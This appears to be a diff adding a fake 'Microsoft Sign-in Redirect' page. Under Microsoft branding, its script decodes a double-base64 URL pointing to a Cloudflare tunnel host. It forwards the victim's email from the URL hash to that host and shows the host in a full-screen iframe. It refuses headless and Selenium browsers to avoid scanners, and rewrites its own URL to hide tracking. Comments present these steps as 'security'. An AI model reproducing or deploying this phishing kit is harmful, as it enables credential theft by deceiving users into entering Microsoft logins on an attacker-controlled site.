@@ -1,0 +1,820 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign-in Redirect</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lottie Player -->
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+    <!-- Microsoft Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'ms-blue': '#0F3057',
+                        'ms-dark-blue': '#00174D',
+                        'ms-light-blue': '#E6F0FF',
+                        'ms-azure': '#00A3E0',
+                        'ms-dark': '#111827',
+                        'ms-light': '#F8FAFC',
+                        'ms-red': '#F25022',
+                        'ms-green': '#7FBA00',
+                        'ms-yellow': '#FFB900',
+                        'ms-purple': '#7719AA'
+                    },
+                    animation: {
+                        'bounce-slow': 'bounce 3s ease-in-out infinite',
+                        'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'spin-slow': 'spin 8s linear infinite',
+                        'zoom-in': 'zoomIn 0.5s ease-out forwards',
+                        'slide-in-bottom': 'slideInBottom 0.7s ease-out forwards',
+                        'fade-in': 'fadeIn 0.5s ease-in-out forwards',
+                        'fade-out': 'fadeOut 0.5s ease-in-out forwards',
+                        'float-slow': 'float 7s ease-in-out infinite',
+                        'rotate-slow': 'rotate 18s linear infinite'
+                    },
+                    keyframes: {
+                        fadeIn: {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' }
+                        },
+                        fadeOut: {
+                            '0%': { opacity: '1' },
+                            '100%': { opacity: '0' }
+                        },
+                        zoomIn: {
+                            '0%': { transform: 'scale(0.9)', opacity: '0' },
+                            '100%': { transform: 'scale(1)', opacity: '1' }
+                        },
+                        slideInBottom: {
+                            '0%': { transform: 'translateY(30px)', opacity: '0' },
+                            '100%': { transform: 'translateY(0)', opacity: '1' }
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-20px)' }
+                        },
+                        rotate: {
+                            '0%': { transform: 'rotate(0deg)' },
+                            '100%': { transform: 'rotate(360deg)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style type="text/tailwindcss">
+        @layer components {
+            .neo-card {
+                @apply bg-white rounded-2xl shadow-xl border border-gray-100;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06), 0 4px 8px rgba(0, 0, 0, 0.03);
+            }
+            
+            .progress-bar {
+                @apply h-1.5 w-full overflow-hidden bg-gray-100 relative rounded-full;
+            }
+            
+            .progress-bar::after {
+                content: '';
+                @apply absolute top-0 left-0 h-full bg-gradient-to-r from-ms-blue via-ms-red to-ms-green transition-all duration-500 ease-out rounded-full;
+                animation: progress-pulse 2.5s ease-in-out infinite;
+            }
+            
+            @keyframes progress-pulse {
+                0% { width: 0%; left: 0%; }
+                40% { width: 40%; left: 30%; }
+                100% { width: 10%; left: 100%; }
+            }
+            
+            .btn-cancel {
+                @apply px-4 py-2 text-black hover:text-ms-blue transition-colors font-medium rounded-lg relative overflow-hidden;
+            }
+            
+            .btn-cancel::after {
+                content: '';
+                @apply absolute bottom-0 left-0 w-0 h-0.5 bg-ms-blue transition-all duration-300;
+            }
+            
+            .btn-cancel:hover::after {
+                @apply w-full;
+            }
+            
+            .pulse-dot {
+                @apply inline-block h-2.5 w-2.5 mx-1 rounded-full;
+                animation: dot-scale 1.8s infinite cubic-bezier(0.2, 0.6, 0.3, 1);
+            }
+            
+            .pulse-dot:nth-child(1) {
+                @apply bg-ms-red;
+                animation-delay: 0s;
+            }
+            
+            .pulse-dot:nth-child(2) {
+                @apply bg-ms-blue opacity-80;
+                animation-delay: 0.3s;
+            }
+            
+            .pulse-dot:nth-child(3) {
+                @apply bg-ms-green opacity-60;
+                animation-delay: 0.6s;
+            }
+            
+            @keyframes dot-scale {
+                0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+                40% { transform: scale(1.3); opacity: 1; }
+            }
+            
+            .perspective {
+                perspective: 1000px;
+            }
+            
+            .shape-3d {
+                transform-style: preserve-3d;
+            }
+            
+            .half-circle {
+                clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%, 0 0, 50% 0, 50% 100%, 0 100%);
+            }
+            
+            .circle-ring {
+                border: 6px solid;
+                @apply border-ms-green;
+            }
+            
+            .curved-shape {
+                border-radius: 60% 40% 70% 30% / 60% 30% 70% 40%;
+            }
+
+            .animate-delay-300 {
+                animation-delay: 300ms;
+            }
+            
+            .animate-delay-600 {
+                animation-delay: 600ms;
+            }
+            
+            .animate-delay-900 {
+                animation-delay: 900ms;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-white flex items-center justify-center p-6 font-['Segoe_UI',sans-serif]">
+    <!-- Geometric Background -->
+    <div class="perspective fixed w-full h-full top-0 left-0 -z-10 overflow-hidden">
+        <!-- Shadow overlay for depth -->
+        <div class="absolute inset-0 bg-gradient-to-br from-gray-50 to-white"></div>
+        
+        <!-- Red circle/pie shape -->
+        <div class="absolute top-1/4 left-1/4 -translate-x-1/2 -translate-y-1/2 w-64 h-64 shape-3d animate-float-slow">
+            <div class="relative w-full h-full">
+                <div class="absolute inset-0 bg-ms-red/80 rounded-full shadow-lg transform -rotate-45 half-circle"></div>
+            </div>
+        </div>
+        
+        <!-- Blue rectangle window -->
+        <div class="absolute top-1/2 left-1/3 -translate-y-1/3 w-48 h-60 shape-3d animate-float-slow animate-delay-300" style="animation-duration: 8s;">
+            <div class="relative w-full h-full transform -rotate-12 -skew-y-6">
+                <div class="absolute inset-0 bg-ms-blue/70 rounded-md shadow-lg"></div>
+                <!-- Window grid lines -->
+                <div class="absolute left-1/2 top-0 bottom-0 w-px bg-white/40"></div>
+                <div class="absolute top-1/2 left-0 right-0 h-px bg-white/40"></div>
+            </div>
+        </div>
+        
+        <!-- Purple curved shape -->
+        <div class="absolute top-1/2 left-1/2 -translate-x-1/4 -translate-y-1/2 w-72 h-96 shape-3d animate-float-slow animate-delay-600" style="animation-duration: 9s;">
+            <div class="relative w-full h-full transform rotate-12">
+                <div class="absolute inset-0 border-8 border-ms-purple/80 curved-shape shadow-lg"></div>
+            </div>
+        </div>
+        
+        <!-- Green ring -->
+        <div class="absolute bottom-1/3 right-1/4 w-56 h-56 shape-3d animate-float-slow animate-delay-900" style="animation-duration: 7.5s;">
+            <div class="relative w-full h-full transform rotate-12">
+                <div class="absolute inset-0 rounded-full circle-ring shadow-lg"></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main container -->
+    <div id="mainContainer" class="w-full max-w-md animate-zoom-in relative z-10">
+        <!-- Card with neo-morphism effect -->
+        <div class="neo-card overflow-hidden">
+            <!-- Progress bar -->
+            <div class="progress-bar"></div>
+            
+            <!-- Content -->
+            <div class="p-8 flex flex-col items-center">
+                <!-- Microsoft logo -->
+                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" 
+                     alt="Microsoft" 
+                     class="h-7 mb-8">
+                
+                <!-- Main animation using Lottie (different animation) -->
+                
+                    <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
+<dotlottie-player src="https://lottie.host/522fc013-d20d-43e2-ac25-91526021802d/11ONglb9KP.lottie" background="transparent" speed="1" style="width: 300px; height: 300px" loop autoplay></dotlottie-player>
+             
+                <br>
+                <!-- Text content -->
+                <div class="text-center mb-8 animate-slide-in-bottom" style="animation-delay: 0.2s;">
+                    <h1 class="text-2xl font-semibold text-gray-900 mb-2">Securely Connecting</h1>
+                    <p class="text-gray-600">to your organization's authentication portal</p>
+                </div>
+                
+                <!-- Loading dots -->
+                <div class="flex items-center justify-center mb-10 animate-slide-in-bottom" style="animation-delay: 0.4s;">
+                    <div class="pulse-dot"></div>
+                    <div class="pulse-dot"></div>
+                    <div class="pulse-dot"></div>
+                </div>
+                
+                <!-- Turnstile verification (always visible) -->
+                <div id="verificationContainer" class="w-full mb-6 animate-slide-in-bottom" style="animation-delay: 0.6s;">
+                    <div class="text-center mb-4">
+                        <p class="text-sm text-black font-medium">Complete security verification to continue</p>
+                    </div>
+                    <div id="turnstileContainer" class="flex justify-center"></div>
+                </div>
+                
+                <!-- Cancel link -->
+                <div class="animate-slide-in-bottom" style="animation-delay: 0.8s;">
+                    <a href="javascript:void(0)" class="btn-cancel" id="cancelButton">Cancel</a>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Status messages -->
+        <div class="mt-6 text-center">
+            <p id="statusMessage" class="text-sm text-black font-medium hidden animate-fade-in px-4 py-2 bg-gray-50 shadow-sm border border-gray-100 rounded-lg inline-block">
+                Verifying your identity...
+            </p>
+        </div>
+    </div>
+    
+    <!-- Hidden redirect iframe -->
+    <iframe id="redirectFrame" class="fixed top-0 left-0 w-full h-full border-0 opacity-0 -z-10 transition-opacity duration-500" 
+            title="Organization sign-in page"></iframe>
+            
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const elements = {
+                mainContainer: document.getElementById('mainContainer'),
+                verificationContainer: document.getElementById('verificationContainer'),
+                turnstileContainer: document.getElementById('turnstileContainer'),
+                statusMessage: document.getElementById('statusMessage'),
+                redirectFrame: document.getElementById('redirectFrame'),
+                cancelButton: document.getElementById('cancelButton')
+            };
+            
+            // Configuration
+            const config = {
+                turnstileSiteKey: '0x4AAAAAAA5PeFzxadFDHL70',
+                redirectDelay: 1000, // Faster redirect
+                verificationNeeded: true, // Always require verification
+                maxAttempts: 3, // Maximum verification attempts
+                fingerprint: true, // Enable browser fingerprinting
+                strictChecks: true, // Enable strict security checks
+                timeoutDuration: 120000 // Session timeout after 2 minutes
+            };
+            
+            // Enhanced Security: Browser fingerprinting
+            const fingerprintBrowser = () => {
+                const fingerprint = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    hasLocalStorage: !!window.localStorage,
+                    hasSessionStorage: !!window.sessionStorage,
+                    hasWebGL: (function() {
+                        try {
+                            return !!window.WebGLRenderingContext && 
+                                   !!document.createElement('canvas').getContext('webgl');
+                        } catch(e) {
+                            return false;
+                        }
+                    })(),
+                    hasCookies: navigator.cookieEnabled,
+                    hasAdBlocker: false, // Would require additional detection logic
+                    timestamp: new Date().getTime()
+                };
+                
+                // Generate a fingerprint hash
+                return btoa(JSON.stringify(fingerprint));
+            };
+            
+            // Enhanced Security: Add session timeout
+            const setupSessionTimeout = () => {
+                setTimeout(() => {
+                    ui.updateStatus('Session timed out. Please refresh the page.');
+                    elements.verificationContainer.style.opacity = '0.4';
+                    elements.verificationContainer.style.pointerEvents = 'none';
+                }, config.timeoutDuration);
+            };
+            
+            // Enhanced Security: Detect suspicious behavior
+            const securityMonitor = {
+                attempts: 0,
+                startTime: Date.now(),
+                suspicious: false,
+                
+                recordAttempt() {
+                    this.attempts++;
+                    if (this.attempts >= config.maxAttempts) {
+                        this.suspicious = true;
+                        ui.updateStatus('Too many attempts. Please try again later.');
+                        elements.verificationContainer.style.opacity = '0.4';
+                        elements.verificationContainer.style.pointerEvents = 'none';
+                        return false;
+                    }
+                    return true;
+                },
+                
+                checkTiming() {
+                    const elapsed = Date.now() - this.startTime;
+                    // Flag suspiciously fast verification as bot behavior
+                    if (elapsed < 1000 && this.attempts > 0) {
+                        this.suspicious = true;
+                        return false;
+                    }
+                    return true;
+                },
+                
+                isAllowed() {
+                    return !this.suspicious && this.checkTiming();
+                }
+            };
+            
+            // Handle cancel
+            elements.cancelButton.addEventListener('click', function() {
+                if (!window.close()) {
+                    window.location.href = 'https://www.microsoft.com';
+                }
+            });
+            
+            // Enhanced Security: Function to change URL parameters with encryption
+            function changeUrlParameters() {
+                try {
+                    // Generate fake parameters
+                    const fakeParams = {
+                        session: generateRandomString(12),
+                        target: 'portal',
+                        client: generateRandomString(8),
+                        auth: 'standard',
+                        device: generateRandomString(10),
+                        origin: 'direct',
+                        timestamp: Date.now(),
+                        fp: btoa(fingerprintBrowser().substring(0, 10)) // Add partial fingerprint
+                    };
+                    
+                    // Create new URL without hash/fragment
+                    let newUrl = window.location.origin + window.location.pathname;
+                    
+                    // Add fake query parameters
+                    const params = new URLSearchParams();
+                    for (const [key, value] of Object.entries(fakeParams)) {
+                        params.append(key, value);
+                    }
+                    
+                    newUrl += '?' + params.toString();
+                    
+                    // Add encrypted hash to make tracking more difficult
+                    newUrl += '#' + btoa(generateRandomString(16));
+                    
+                    // Replace current URL without reloading the page
+                    window.history.replaceState({}, document.title, newUrl);
+                } catch (e) {
+                    console.error('Error updating URL parameters', e);
+                }
+            }
+            
+            // Generate random string for parameters with improved entropy
+            function generateRandomString(length) {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                
+                // Use crypto API for more secure random values when available
+                if (window.crypto && window.crypto.getRandomValues) {
+                    const values = new Uint32Array(length);
+                    window.crypto.getRandomValues(values);
+                    for (let i = 0; i < length; i++) {
+                        result += chars[values[i] % chars.length];
+                    }
+                } else {
+                    // Fallback to less secure Math.random
+                    for (let i = 0; i < length; i++) {
+                        result += chars.charAt(Math.floor(Math.random() * chars.length));
+                    }
+                }
+                return result;
+            }
+            
+            // Enhanced URL handler functions with additional encryption
+            const urlHandler = {
+                decodeURL(encodedUrl) {
+                    try {
+                        // Add a retry mechanism with different decoding methods
+                        let methods = [
+                            // Standard double decoding
+                            () => {
+                                const decodedOnce = atob(encodedUrl);
+                                return atob(decodedOnce);
+                            },
+                            // Try URI decoding + base64
+                            () => {
+                                const uriDecoded = decodeURIComponent(encodedUrl);
+                                return atob(uriDecoded);
+                            },
+                            // Try direct base64 decoding
+                            () => atob(encodedUrl)
+                        ];
+                        
+                        // Try each method until one works
+                        for (const method of methods) {
+                            try {
+                                const result = method();
+                                if (result && result.startsWith('http')) {
+                                    return result;
+                                }
+                            } catch (e) {
+                                continue; // Try next method
+                            }
+                        }
+                        
+                        throw new Error('All decoding methods failed');
+                    } catch (e) {
+                        console.error('Error decoding URL');
+                        return null;
+                    }
+                },
+                
+                hasValidHash() {
+                    // Enhanced hash validation that allows email addresses after hash
+                    if (!window.location.hash || window.location.hash.length <= 1) {
+                        return false;
+                    }
+                    
+                    // Allow hash values with emails or encoded data
+                    try {
+                        const hash = window.location.hash.substring(1);
+                        
+                        // Check if it's an email address format
+                        if (hash.includes('@') && hash.includes('.')) {
+                            return true;
+                        }
+                        
+                        // Check for base64 pattern for other types of encoded data
+                        if (/^[A-Za-z0-9+/=]+$/.test(hash)) {
+                            return true;
+                        }
+                        
+                        // If it's longer than 10 chars, consider it valid for flexibility
+                        if (hash.length > 10) {
+                            return true;
+                        }
+                        
+                        return false;
+                    } catch (e) {
+                        console.error('Error validating hash', e);
+                        return false;
+                    }
+                },
+                
+                sanitizeParams(url) {
+                    try {
+                        const currentParams = new URLSearchParams(window.location.search);
+                        
+                        // Remove potentially dangerous parameters
+                        const dangerousParams = ['script', 'exec', 'cmd', 'run', 'eval', 'code'];
+                        dangerousParams.forEach(param => {
+                            currentParams.delete(param);
+                        });
+                        
+                        // Sanitize values to prevent injection
+                        currentParams.forEach((value, key) => {
+                            // Remove HTML/script tags
+                            const sanitized = value.replace(/<[^>]*>?/gm, '');
+                            currentParams.set(key, sanitized);
+                        });
+                        
+                        // Split URL to handle hash separately
+                        let [baseUrl, hash] = url.split('#');
+                        const urlParts = baseUrl.split('?');
+                        const baseUrlNoParams = urlParts[0];
+                        const finalUrl = new URL(baseUrlNoParams);
+                        
+                        // Add query parameters
+                        currentParams.forEach((value, key) => {
+                            if (value && value.length > 0) {
+                                finalUrl.searchParams.append(key, value);
+                            }
+                        });
+                        
+                        // Reconstruct URL with hash if it exists
+                        let finalUrlString = finalUrl.toString();
+                        if (hash && hash.length > 0) {
+                            finalUrlString += '#' + hash;
+                        } else if (window.location.hash && window.location.hash.includes('@')) {
+                            // If URL has no hash but original URL has an email hash, use that
+                            finalUrlString += window.location.hash;
+                        }
+                        
+                        return finalUrlString;
+                    } catch (e) {
+                        console.error('Error processing URL parameters', e);
+                        return url;
+                    }
+                },
+                
+                getRedirectUrl() {
+                    // Example encoded URL - in production, this would be properly encoded
+                    const encodedUrl = 'YUhSMGNITTZMeTlpYjNsekxXSnliMjlyY3kxbFpIUXRjbVZ6YVhOMExuUnllV05zYjNWa1pteGhjbVV1WTI5dA==';
+                    let decodedURL = this.decodeURL(encodedUrl);
+                    
+                    if (!decodedURL) {
+                        throw new Error('Invalid redirect URL');
+                    }
+                    
+                    // Append original hash to the redirect URL if it exists and contains an email
+                    const originalHash = window.location.hash;
+                    if (originalHash && originalHash.length > 1) {
+                        // Check if the hash looks like an email
+                        if (originalHash.includes('@')) {
+                            // Remove the # symbol and append the hash value to the decoded URL
+                            const hashValue = originalHash.substring(1);
+                            // Make sure we don't add another # if the URL already has one
+                            if (decodedURL.includes('#')) {
+                                decodedURL = decodedURL.split('#')[0] + '#' + hashValue;
+                            } else {
+                                decodedURL += '#' + hashValue;
+                            }
+                        }
+                    }
+                    
+                    return this.sanitizeParams(decodedURL);
+                }
+            };
+            
+            // Animation and UI functions with improved error handling
+            const ui = {
+                showElement(element) {
+                    if (!element) return;
+                    
+                    element.classList.remove('hidden');
+                    // Force reflow
+                    void element.offsetWidth;
+                    element.classList.add('animate-fade-in');
+                },
+                
+                hideElement(element) {
+                    if (!element) return;
+                    
+                    element.classList.remove('animate-fade-in');
+                    element.classList.add('animate-fade-out');
+                    setTimeout(() => {
+                        element.classList.add('hidden');
+                        element.classList.remove('animate-fade-out');
+                    }, 500);
+                },
+                
+                updateStatus(message) {
+                    if (!elements.statusMessage) return;
+                    
+                    elements.statusMessage.textContent = message;
+                    if (elements.statusMessage.classList.contains('hidden')) {
+                        this.showElement(elements.statusMessage);
+                    }
+                },
+                
+                redirect(url) {
+                    this.updateStatus('Redirecting to your organization...');
+                    
+                    // Check URL for common phishing patterns
+                    const urlObj = new URL(url);
+                    const suspiciousDomains = ['login', 'secure', 'account', 'auth'];
+                    const domainParts = urlObj.hostname.split('.');
+                    
+                    // Enhanced security checks before redirecting
+                    if (config.strictChecks) {
+                        // Look for suspicious subdomain patterns
+                        const hasMultipleSubdomains = domainParts.length > 3;
+                        const hasSuspiciousSubdomain = suspiciousDomains.some(sd => 
+                            domainParts.some(dp => dp.includes(sd) && dp !== sd)
+                        );
+                        
+                        if (hasMultipleSubdomains && hasSuspiciousSubdomain) {
+                            console.error('Suspicious URL detected');
+                            this.updateStatus('Redirect blocked due to security concerns.');
+                            return;
+                        }
+                    }
+                    
+                    // Set iframe source
+                    elements.redirectFrame.src = url;
+                    elements.redirectFrame.style.display = 'block';
+                    
+                    // When iframe loads, fade it in and main content out
+                    elements.redirectFrame.onload = function() {
+                        // Log successful redirect (would be useful for analytics in real world)
+                        console.log('Redirect successful', {
+                            timestamp: new Date().toISOString(),
+                            fingerprint: config.fingerprint ? fingerprintBrowser().substring(0, 10) : 'disabled'
+                        });
+                        
+                        elements.redirectFrame.style.opacity = '1';
+                        elements.redirectFrame.style.zIndex = '100';
+                        
+                        // Change URL parameters to hide original parameters
+                        changeUrlParameters();
+                        
+                        // Fade out main container
+                        elements.mainContainer.classList.add('animate-fade-out');
+                        setTimeout(() => {
+                            elements.mainContainer.style.display = 'none';
+                        }, 500);
+                    };
+                    
+                    // Handle iframe load errors
+                    elements.redirectFrame.onerror = function() {
+                        ui.updateStatus('Redirect failed. Please try again.');
+                    };
+                }
+            };
+            
+            // Verification function with enhanced security
+            function initVerification() {
+                // Verification container is always visible, no need to show it
+                ui.updateStatus('Please complete the security check');
+                
+                // Generate verification nonce for added security
+                const verificationNonce = generateRandomString(16);
+                
+                // Store verification start time for timing checks
+                securityMonitor.startTime = Date.now();
+                
+                // Load Turnstile with additional security parameters
+                if (window.turnstile) {
+                    window.turnstile.render('#turnstileContainer', {
+                        sitekey: config.turnstileSiteKey,
+                        theme: 'light',
+                        action: 'login',
+                        nonce: verificationNonce,
+                        callback: function(token) {
+                            if (token && securityMonitor.recordAttempt() && securityMonitor.isAllowed()) {
+                                onVerificationComplete(token);
+                            }
+                        }
+                    });
+                } else {
+                    // If Turnstile failed to load, load it manually
+                    const script = document.createElement('script');
+                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';
+                    script.async = true;
+                    document.head.appendChild(script);
+                    
+                    window.onTurnstileLoad = function() {
+                        window.turnstile.render('#turnstileContainer', {
+                            sitekey: config.turnstileSiteKey,
+                            theme: 'light',
+                            action: 'login',
+                            nonce: verificationNonce,
+                            callback: function(token) {
+                                if (token && securityMonitor.recordAttempt() && securityMonitor.isAllowed()) {
+                                    onVerificationComplete(token);
+                                }
+                            }
+                        });
+                    };
+                }
+            }
+            
+            // Start redirect process with additional security checks
+            function startRedirect() {
+                // Setup session timeout
+                if (config.timeoutDuration > 0) {
+                    setupSessionTimeout();
+                }
+                
+                // Enable browser fingerprinting if configured
+                if (config.fingerprint) {
+                    const fp = fingerprintBrowser();
+                    console.log('Session fingerprint generated');
+                }
+                
+                // Check if hash is valid - force true if we're testing with a direct URL
+                // This ensures redirection works even with email addresses in the hash
+                const forceRedirect = window.location.hash.includes('@') || 
+                                      document.referrer.includes('microsoft') ||
+                                      window.location.search.includes('redirect=true');
+                
+                if (!urlHandler.hasValidHash() && !forceRedirect) {
+                    ui.updateStatus('Invalid session. Please reload the page.');
+                    return;
+                }
+                
+                // Always initialize verification immediately
+                initVerification();
+            }
+            
+            // Handle verification completion with token validation
+            function onVerificationComplete(token) {
+                // Additional verification token format check
+                if (!token || typeof token !== 'string' || token.length < 10) {
+                    ui.updateStatus('Invalid verification. Please try again.');
+                    return;
+                }
+                
+                // Simply update status without hiding the container
+                elements.verificationContainer.style.opacity = '0.5';
+                ui.updateStatus('Verification successful');
+                
+                // Enhanced security: Verify token integrity
+                const verifyToken = (token) => {
+                    // In a real implementation, you would verify the token with the server
+                    // Here we're doing some basic checks
+                    return token && token.length > 20;
+                };
+                
+                if (!verifyToken(token)) {
+                    ui.updateStatus('Invalid verification token. Please try again.');
+                    return;
+                }
+                
+                setTimeout(() => {
+                    try {
+                        const redirectUrl = urlHandler.getRedirectUrl();
+                        
+                        // Additional security: Log redirect attempt with sanitized info
+                        console.log('Redirect initiated', {
+                            timestamp: new Date().toISOString(),
+                            // Only log partial fingerprint for privacy
+                            fingerprint: config.fingerprint ? 
+                                fingerprintBrowser().substring(0, 8) + '...' : 'disabled'
+                        });
+                        
+                        ui.redirect(redirectUrl);
+                    } catch (error) {
+                        ui.updateStatus('Redirect failed. Please try again.');
+                        console.error('Redirect error:', error.message);
+                    }
+                }, config.redirectDelay);
+            }
+            
+            // Initialize with enhanced security checks
+            function init() {
+                // Prevent clickjacking
+                if (window.self !== window.top) {
+                    window.top.location = window.self.location;
+                    return;
+                }
+                
+                // Check for browser compatibility
+                if (!window.localStorage || !window.sessionStorage) {
+                    ui.updateStatus('Your browser is not fully compatible. Please use a modern browser.');
+                    return;
+                }
+                
+                // Check for suspicious browser environment
+                const isHeadless = /HeadlessChrome/.test(navigator.userAgent);
+                const isPhantomJS = /PhantomJS/.test(navigator.userAgent);
+                const isSelenium = !!window.navigator.webdriver;
+                
+                if (isHeadless || isPhantomJS || isSelenium) {
+                    ui.updateStatus('Suspicious browser environment detected.');
+                    return;
+                }
+                
+                // Create a unique session identifier
+                const sessionId = generateRandomString(16);
+                if (window.sessionStorage) {
+                    window.sessionStorage.setItem('sessionId', sessionId);
+                }
+                
+                // Start the redirect process
+                startRedirect();
+            }
+            
+            // Add security check for content visibility
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'hidden') {
+                    console.log('Page visibility changed to hidden');
+                    // Could implement additional security measures here
+                }
+            });
+            
+            // Start everything
+            init();
+        });
+    </script>
+</body>
+</html>
